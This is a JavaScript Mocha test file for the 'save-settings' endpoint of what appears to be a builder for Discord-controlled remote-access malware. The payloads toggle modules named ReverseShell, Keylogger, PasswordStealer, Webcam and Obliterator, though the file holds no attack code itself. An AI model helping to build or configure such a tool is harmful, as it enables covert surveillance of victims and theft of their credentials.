const axios = require('axios');
const { describe, it } = require('mocha');
const { expect } = require('chai');

const URL = 'http://localhost:3000/api/save-settings'; // Update the URL

describe('Server Response Test', function () {
    this.timeout(10000); // Set global timeout to 10 seconds

    it('should return 200 OK', async function () {
        try {
            const response = await axios.post(URL, {
                BotData: {
                    Token: "this is an example for the settings.json file",
                    GuildID: "this is an example for the settings.json file",
                },
                Modules: {
                    ReverseShell: true,
                    FileBrowser: false,
                    Downloader: false,
                    BSOD: false,
                    Clipboard: false,
                    AudioControlls: true,
                    GhostWriter: false,
                    KeyboardShortcuts: false,
                    Keylogger: true,
                    Obliterator: false,
                    PasswordStealer: true,
                    Screenshot: true,
                    Webcam: true,
                    WallpaperChanger: false,
                    TTS: false
                }
            });
            expect(response.status).to.equal(200);
            console.log('✅ Test Passed: Server responded with 200 OK');
        } catch (error) {
            console.error(`❌ Test Failed: ${error.message}`);
            throw error;
        }
    });


    it('should return 405 Method Not Allowed for GET request', async function () {
        try {
            const response = await axios.get(URL);
            expect(response.status).to.equal(405);
            console.log('✅ Test Passed: Server responded with 405 Method Not Allowed');
        } catch (error) {
            if (error.response && error.response.status === 405) {
                console.log('✅ Test Passed: Server responded with 405 Method Not Allowed');
            } else {
                console.error(`❌ Test Failed: ${error.message}`);
                throw error;
            }
        }
    });

    it('should return 500 Internal Server Error for server issues', async function () {
        try {
            const response = await axios.post(URL, {
                // Simulate server error by sending data that causes an error
                BotData: {
                    Token: "this is an example for the settings.json file",
                    GuildID: "this is an example for the settings.json file",
                },
                Modules: {
                    ReverseShell: true,
                    FileBrowser: false,
                    Downloader: false,
                    BSOD: false,
                    Clipboard: false,
                    AudioControlls: true,
                    GhostWriter: false,
                    KeyboardShortcuts: false,
                    Keylogger: true,
                    Obliterator: false,
                    PasswordStealer: true,
                    Screenshot: true,
                    Webcam: true,
                    WallpaperChanger: false,
                    TTS: false
                },
                causeError: true // This will trigger the server error
            });
            expect(response.status).to.equal(500);
            console.log('✅ Test Passed: Server responded with 500 Internal Server Error');
        } catch (error) {
            if (error.response && error.response.status === 500) {
                console.log('✅ Test Passed: Server responded with 500 Internal Server Error');
            } else {
                console.error(`❌ Test Failed: ${error.message}`);
                throw error;
            }
        }
    });
});